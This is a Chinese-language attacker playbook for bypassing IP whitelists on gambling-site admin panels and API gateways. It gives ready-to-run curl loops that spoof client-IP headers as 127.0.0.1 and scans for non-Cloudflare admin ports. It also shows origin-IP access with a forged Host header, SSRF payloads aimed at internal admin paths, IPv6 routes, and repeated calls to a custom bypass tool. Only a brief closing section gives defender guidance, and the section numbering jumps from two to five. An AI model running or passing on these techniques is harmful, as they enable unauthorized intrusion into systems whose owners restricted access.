# IP 白名单绕过杀伤链

> 更新：2026-08-11  
> 工具：`炼蛊房/ip_whitelist_bypass.py`  
> 适用场景：博彩站 Admin 后台 / 运营商面板 / API 网关 被 IP 白名单限制

---

## 一、白名单的实现方式（理解才能绕）

```
实现层         读取方式                          可绕过？
────────────────────────────────────────────────────────
PHP 应用      HTTP_CLIENT_IP (优先级最高)        ✅ 直接注入
PHP 应用      HTTP_X_FORWARDED_FOR (取第一项)    ✅ CF 转发前注入首项
PHP 应用      HTTP_X_REAL_IP                    ✅ 直接注入（Nginx upstream 除外）
Laravel       $request->ip() → TrustProxy 链     ✅/❌ 取决于 trusted proxies 配置
Node/Express  req.ip (trust proxy 配置)          ✅/❌
Nginx 自身    $remote_addr                       ❌ 需源站直连
CF Origin     CF-Connecting-IP (CF 设置)         ❌ 无法伪造（CF 自身设置）
```

**关键规律**：大多数博彩站用 PHP/ThinkPHP/Laravel，IP 获取链如下：

```php
// 常见写法（ThinkPHP 内置）
function getClientIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP']))
        return $_SERVER['HTTP_CLIENT_IP'];
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
        return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0]; // 取第一项！
    return $_SERVER['REMOTE_ADDR'];
}
```

→ 发送 `Client-IP: 127.0.0.1` 或 `X-Forwarded-For: 127.0.0.1` 即可。

## 二、绕过向量优先级（按成功率排序）

### 向量 A：IP Header 注入（最常见，成功率 40-60%）

```bash
# 一键测试所有 Header × 所有 IP 组合
python3 炼蛊房/ip_whitelist_bypass.py headers -u https://target.com/admin/login

# 指定已知公司 IP / 内网 IP
python3 炼蛊房/ip_whitelist_bypass.py headers \
  -u https://target.com/admin \
  --spoof-ips "127.0.0.1,10.0.0.1,192.168.1.1"
```

**手动 curl 快速测试**：

```bash
# 最高优先级的几个 Header，逐一试
for header in "Client-IP" "X-Forwarded-For" "X-Real-IP" "CF-Connecting-IP" "True-Client-IP"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" -H "$header: 127.0.0.1" "https://target.com/admin/login")
  echo "$header: 127.0.0.1 → HTTP $code"
done
```

**ThinkPHP / Laravel 优先测这几个**（命中率最高）：

| 框架 | 最有效 Header |
|------|-------------|
| ThinkPHP | `Client-IP`, `HTTP_CLIENT_IP` |
| Laravel | `X-Forwarded-For`（第一项） |
| 自写 PHP | 逐一枚举 |
| Node/Express | `X-Forwarded-For` |
| Go Gin | `X-Real-IP`, `X-Forwarded-For` |

### 向量 B：X-Forwarded-For 首项注入（CF 场景专用）

**原理**：Cloudflare 不会剥离客户端发来的 XFF，而是在末尾追加真实 IP：

```
你发送：  X-Forwarded-For: 127.0.0.1
CF转发后：X-Forwarded-For: 127.0.0.1, <你的真实IP>
                                ↑
                        应用取第一项 → 127.0.0.1 ✅
```

```bash
curl -sk -H "X-Forwarded-For: 127.0.0.1" https://target.com/admin/login
# 如果返回登录页而非 403 → 绕过成功

# 也可以试多级 XFF
curl -sk -H "X-Forwarded-For: 127.0.0.1, 10.0.0.1" https://target.com/admin
```

### 向量 C：非标准端口（CF 不代理 → 直通源站，无 IP 白名单）

**Cloudflare 默认只代理以下端口**：80, 443, 8080, 8443（HTTP/HTTPS 各一批）  
其余端口流量**直达源站**，源站 Nginx 可能没配 IP 限制。

```bash
# 一键扫描
python3 炼蛊房/ip_whitelist_bypass.py ports -d target.com

# 手动扫高价值端口
for port in 2082 2083 2086 2087 8888 8000 9000 9001 8880 7001; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" --connect-timeout 3 \
    "http://target.com:$port/admin/login")
  [ "$code" != "000" ] && echo "端口 $port → HTTP $code"
done
```

**博彩站常见非标管理端口**：
- `2082` / `2086`：cPanel 非 SSL
- `8888`：aaPanel（宝塔国际版）
- `9999`：宝塔面板 / 自定义
- `7001` / `7002`：部分 Java 应用服务器
- `8080` / `8000`：开发/测试环境遗留
- `8888`：Jupyter / 内网工具

### 向量 D：源站 IP 直连（绕过 CF + 白名单可能失效）

如果 Admin 后台只限制"来自公网的非公司 IP"，直连源站 IP 时：
- Nginx `$remote_addr` = 你的 IP → 依然被拦
- **但**：部分配置让 Nginx 只检查 `X-Forwarded-For`（本来给 CF 用），直连时没有 XFF → 白名单检查失败/跳过

```bash
# 先找源站 IP
python3 炼蛊房/origin_recon.py -d target.com

# 直连源站（Host header 伪装）
curl -sk -H "Host: target.com" "https://<源站IP>/admin/login"

# 或通过 ip_whitelist_bypass.py
python3 炼蛊房/ip_whitelist_bypass.py probe \
  -u https://target.com/admin \
  --origin-ips "1.2.3.4,5.6.7.8"
```

### 向量 E：SSRF → 管理后台（间接绕过）

如果目标有 SSRF 漏洞（图片上传/URL 预览/webhook），让**服务器自己**请求 Admin：

```bash
# 生成 SSRF payload 列表
python3 炼蛊房/ip_whitelist_bypass.py ssrf -d target.com --path /admin/login

# 典型 payload（服务器从内部请求 admin）
http://127.0.0.1/admin/login
http://127.0.0.1:8080/admin/login
http://localhost/admin/login
http://10.0.0.1/admin/login

# 探测 SSRF 点
python3 炼蛊房/ssrf_probe.py probe -u https://target.com
```

### 向量 F：IPv6 探测

部分站点的 IPv4 白名单配置完整，但 IPv6 AAAA 记录绑到的服务器没配 IP 限制：

```bash
# 解析 AAAA 记录
dig AAAA target.com
nslookup -type=AAAA target.com

# 直接访问 IPv6
curl -sk -g "https://[2606:4700::6810:1234]/admin/login" -H "Host: target.com"

# 工具自动检测
python3 炼蛊房/ip_whitelist_bypass.py probe -u https://target.com/admin -d target.com
```

## 五、IoC（绕过成功时留下的特征）

攻击方：
- 大量不同 IP Header 的请求到 `/admin` 路径
- 403 → 200 的状态码转变

防守方参考：
- 应使用 `$remote_addr`（或 `CF-Connecting-IP` + 强制 CF 代理）而非 `X-Forwarded-For` 进行 IP 白名单验证
- 多层 Proxy 时要配置 `trusted_proxies` 白名单
